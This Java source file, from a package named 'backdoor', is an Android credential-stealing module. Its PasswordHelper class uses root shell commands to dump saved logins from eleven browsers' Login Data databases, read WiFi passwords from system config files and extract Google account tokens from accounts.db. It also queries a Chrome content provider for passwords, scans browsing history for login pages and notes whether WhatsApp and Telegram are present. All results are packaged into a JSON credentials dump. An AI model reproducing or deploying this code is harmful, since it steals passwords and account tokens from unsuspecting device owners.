package com.lazyframework.backdoor;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Browser;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PasswordHelper {
    private static final String TAG = "PasswordHelper";
    private Context context;
    private boolean isRooted;

    // Browser package names
    private static final String CHROME = "com.android.chrome";
    private static final String CHROME_BETA = "com.chrome.beta";
    private static final String CHROME_DEV = "com.chrome.dev";
    private static final String FIREFOX = "org.mozilla.firefox";
    private static final String OPERA = "com.opera.browser";
    private static final String BRAVE = "com.brave.browser";
    private static final String EDGE = "com.microsoft.emmx";
    private static final String SAMSUNG_BROWSER = "com.sec.android.app.sbrowser";
    private static final String VIVALDI = "com.vivaldi.browser";
    private static final String DUCKDUCKGO = "com.duckduckgo.mobile.android";
    private static final String KIWI = "com.kiwibrowser.browser";

    public PasswordHelper(Context context, boolean isRooted) {
        this.context = context;
        this.isRooted = isRooted;
    }

    /**
     * Main method to dump all credentials
     */
    public String dumpAllCredentials() {
        try {
            JSONObject result = new JSONObject();
            JSONArray credentials = new JSONArray();

            // 1. Browser saved passwords
            JSONArray browserPasswords = getBrowserPasswords();
            if (browserPasswords.length() > 0) {
                JSONObject browser = new JSONObject();
                browser.put("type", "browser_passwords");
                browser.put("count", browserPasswords.length());
                browser.put("data", browserPasswords);
                credentials.put(browser);
            }

            // 2. WiFi passwords (requires root)
            if (isRooted) {
                JSONArray wifiPasswords = getWifiPasswords();
                if (wifiPasswords.length() > 0) {
                    JSONObject wifi = new JSONObject();
                    wifi.put("type", "wifi_passwords");
                    wifi.put("count", wifiPasswords.length());
                    wifi.put("data", wifiPasswords);
                    credentials.put(wifi);
                }
            }

            // 3. Google Account tokens (requires root)
            if (isRooted) {
                JSONArray googleTokens = getGoogleAccountTokens();
                if (googleTokens.length() > 0) {
                    JSONObject google = new JSONObject();
                    google.put("type", "google_tokens");
                    google.put("count", googleTokens.length());
                    google.put("data", googleTokens);
                    credentials.put(google);
                }
            }

            // 4. App specific credentials (WhatsApp, Telegram, etc)
            JSONArray appCredentials = getAppCredentials();
            if (appCredentials.length() > 0) {
                JSONObject apps = new JSONObject();
                apps.put("type", "app_credentials");
                apps.put("count", appCredentials.length());
                apps.put("data", appCredentials);
                credentials.put(apps);
            }

            result.put("status", "success");
            result.put("type", "credentials_dump");
            result.put("data", credentials);
            result.put("total", credentials.length());
            result.put("timestamp", System.currentTimeMillis());
            result.put("is_rooted", isRooted);

            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "Dump credentials error: " + e.getMessage(), e);
            return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
        }
    }

    /**
     * Get saved passwords from browsers
     */
    private JSONArray getBrowserPasswords() {
        JSONArray passwords = new JSONArray();

        try {
            // Method 1: Try to read from browser databases (requires root)
            if (isRooted) {
                JSONArray rootPasswords = getBrowserPasswordsFromRoot();
                if (rootPasswords.length() > 0) {
                    return rootPasswords;
                }
            }

            // Method 2: Try via ContentProvider (Android 8+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                JSONArray providerPasswords = getBrowserPasswordsFromProvider();
                if (providerPasswords.length() > 0) {
                    return providerPasswords;
                }
            }

            // Method 3: Get from browser history as fallback
            JSONArray historyPasswords = getBrowserHistoryWithCredentials();
            if (historyPasswords.length() > 0) {
                return historyPasswords;
            }

        } catch (Exception e) {
            Log.e(TAG, "Get browser passwords error: " + e.getMessage());
        }

        return passwords;
    }

    /**
     * Get browser passwords from root access (data/data/)
     */
    private JSONArray getBrowserPasswordsFromRoot() {
        JSONArray passwords = new JSONArray();

        try {
            String[] browserPackages = {
                    CHROME, CHROME_BETA, CHROME_DEV, FIREFOX,
                    OPERA, BRAVE, EDGE, SAMSUNG_BROWSER,
                    VIVALDI, DUCKDUCKGO, KIWI
            };

            for (String pkg : browserPackages) {
                try {
                    // Check if browser is installed
                    context.getPackageManager().getPackageInfo(pkg, 0);

                    // Path to login data database
                    String dbPath = "/data/data/" + pkg + "/app_chrome/Default/Login Data";
                    File dbFile = new File(dbPath);

                    if (dbFile.exists() && dbFile.canRead()) {
                        JSONArray browserPasswords = readLoginDatabase(dbPath, pkg);
                        for (int i = 0; i < browserPasswords.length(); i++) {
                            passwords.put(browserPasswords.get(i));
                        }
                    }

                    // Try alternative path for some browsers
                    String altDbPath = "/data/data/" + pkg + "/app_webview/Default/Login Data";
                    File altDbFile = new File(altDbPath);
                    if (altDbFile.exists() && altDbFile.canRead()) {
                        JSONArray browserPasswords = readLoginDatabase(altDbPath, pkg);
                        for (int i = 0; i < browserPasswords.length(); i++) {
                            passwords.put(browserPasswords.get(i));
                        }
                    }

                } catch (Exception e) {
                    // Browser not installed or cannot access
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Root browser passwords error: " + e.getMessage());
        }

        return passwords;
    }

    /**
     * Read Chrome login database
     */
    private JSONArray readLoginDatabase(String dbPath, String browser) {
        JSONArray passwords = new JSONArray();

        try {
            // Use sqlite3 command via root
            Process process = Runtime.getRuntime().exec(new String[]{
                    "su", "-c", "sqlite3 " + dbPath + " \"SELECT origin_url, username_value, password_value FROM logins;\""
            });

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;

            while ((line = reader.readLine()) != null) {
                String[] parts = line.split("\\|");
                if (parts.length >= 3) {
                    JSONObject entry = new JSONObject();
                    entry.put("url", parts[0]);
                    entry.put("username", parts[1]);
                    entry.put("password", parts[2]);
                    entry.put("browser", browser);
                    entry.put("source", "database");
                    passwords.put(entry);
                }
            }
            reader.close();

        } catch (Exception e) {
            Log.w(TAG, "Read login database error: " + e.getMessage());
        }

        return passwords;
    }

    /**
     * Get browser passwords from ContentProvider (Android 8+)
     */
    private JSONArray getBrowserPasswordsFromProvider() {
        JSONArray passwords = new JSONArray();

        try {
            // Chrome AutoFill provider
            Uri uri = Uri.parse("content://com.android.chrome.browser/passwords");

            try {
                Cursor cursor = context.getContentResolver().query(
                        uri,
                        new String[]{"url", "username", "password"},
                        null, null, null
                );

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject entry = new JSONObject();
                        entry.put("url", getColumnValue(cursor, "url"));
                        entry.put("username", getColumnValue(cursor, "username"));
                        entry.put("password", getColumnValue(cursor, "password"));
                        entry.put("browser", "chrome");
                        entry.put("source", "provider");
                        passwords.put(entry);
                    } while (cursor.moveToNext());
                    cursor.close();
                }
            } catch (Exception e) {
                // Chrome may not have provider
            }

        } catch (Exception e) {
            Log.e(TAG, "Provider passwords error: " + e.getMessage());
        }

        return passwords;
    }

    /**
     * Get credentials from browser history (URLs that look like login pages)
     */
    private JSONArray getBrowserHistoryWithCredentials() {
        JSONArray passwords = new JSONArray();

        try {
            Uri uri = Uri.parse("content://com.android.chrome.browser/history");

            Cursor cursor = context.getContentResolver().query(
                    uri,
                    new String[]{"url", "title"},
                    null, null, "date DESC LIMIT 100"
            );

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String url = getColumnValue(cursor, "url");
                    String title = getColumnValue(cursor, "title");

                    // Check if URL contains login keywords
                    if (url != null && (
                            url.contains("login") || url.contains("signin") ||
                                    url.contains("auth") || url.contains("password") ||
                                    url.contains("account") || url.contains("profile")
                    )) {
                        JSONObject entry = new JSONObject();
                        entry.put("url", url);
                        entry.put("title", title != null ? title : "");
                        entry.put("type", "potential_login_page");
                        entry.put("source", "history");
                        passwords.put(entry);
                    }

                } while (cursor.moveToNext());
                cursor.close();
            }

        } catch (Exception e) {
            Log.w(TAG, "History credentials error: " + e.getMessage());
        }

        return passwords;
    }

    /**
     * Get WiFi passwords (requires root)
     */
    private JSONArray getWifiPasswords() {
        JSONArray wifiNetworks = new JSONArray();

        try {
            if (!isRooted) return wifiNetworks;

            // Try to read wpa_supplicant.conf
            String[] paths = {
                    "/data/misc/wifi/wpa_supplicant.conf",
                    "/data/misc/wifi/WifiConfigStore.xml"
            };

            for (String path : paths) {
                File file = new File(path);
                if (file.exists() && file.canRead()) {
                    Process process = Runtime.getRuntime().exec(new String[]{
                            "su", "-c", "cat " + path
                    });

                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;

                    while ((line = reader.readLine()) != null) {
                        // Parse network block
                        if (line.contains("network=") || line.contains("ssid=")) {
                            if (line.contains("ssid=")) {
                                String ssid = line.replace("ssid=", "").replace("\"", "").trim();
                                // Look for psk= or password=
                                String password = "";
                                // Continue reading to find password
                                String nextLine;
                                while ((nextLine = reader.readLine()) != null) {
                                    if (nextLine.contains("psk=")) {
                                        password = nextLine.replace("psk=", "").replace("\"", "").trim();
                                        break;
                                    }
                                    if (nextLine.contains("password=")) {
                                        password = nextLine.replace("password=", "").replace("\"", "").trim();
                                        break;
                                    }
                                    if (nextLine.contains("}") || nextLine.contains("network=")) {
                                        break;
                                    }
                                }

                                if (!ssid.isEmpty() && !password.isEmpty()) {
                                    JSONObject wifi = new JSONObject();
                                    wifi.put("ssid", ssid);
                                    wifi.put("password", password);
                                    wifi.put("source", path);
                                    wifiNetworks.put(wifi);
                                }
                            }
                        }
                    }
                    reader.close();
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "WiFi passwords error: " + e.getMessage());
        }

        return wifiNetworks;
    }

    /**
     * Get Google Account tokens (requires root)
     */
    private JSONArray getGoogleAccountTokens() {
        JSONArray tokens = new JSONArray();

        try {
            if (!isRooted) return tokens;

            // Google accounts database path
            String dbPath = "/data/data/com.google.android.gms/databases/accounts.db";
            File dbFile = new File(dbPath);

            if (dbFile.exists() && dbFile.canRead()) {
                Process process = Runtime.getRuntime().exec(new String[]{
                        "su", "-c", "sqlite3 " + dbPath + " \"SELECT name, type, value FROM tokens;\""
                });

                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;

                while ((line = reader.readLine()) != null) {
                    String[] parts = line.split("\\|");
                    if (parts.length >= 3) {
                        JSONObject token = new JSONObject();
                        token.put("account", parts[0]);
                        token.put("type", parts[1]);
                        token.put("token", parts[2]);
                        tokens.put(token);
                    }
                }
                reader.close();
            }

        } catch (Exception e) {
            Log.e(TAG, "Google tokens error: " + e.getMessage());
        }

        return tokens;
    }

    /**
     * Get app-specific credentials
     */
    private JSONArray getAppCredentials() {
        JSONArray credentials = new JSONArray();

        try {
            // WhatsApp
            if (isWhatsAppInstalled()) {
                JSONObject wa = new JSONObject();
                wa.put("app", "WhatsApp");
                wa.put("type", "notification_access");
                wa.put("status", "installed");
                credentials.put(wa);
            }

            // Telegram
            if (isTelegramInstalled()) {
                JSONObject tg = new JSONObject();
                tg.put("app", "Telegram");
                tg.put("type", "notification_access");
                tg.put("status", "installed");
                credentials.put(tg);
            }

        } catch (Exception e) {
            Log.e(TAG, "App credentials error: " + e.getMessage());
        }

        return credentials;
    }

    // ==================== HELPER METHODS ====================

    private boolean isWhatsAppInstalled() {
        try {
            context.getPackageManager().getPackageInfo("com.whatsapp", 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private boolean isTelegramInstalled() {
        try {
            context.getPackageManager().getPackageInfo("org.telegram.messenger", 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private String getColumnValue(Cursor cursor, String columnName) {
        int index = cursor.getColumnIndex(columnName);
        return (index >= 0) ? cursor.getString(index) : null;
    }
}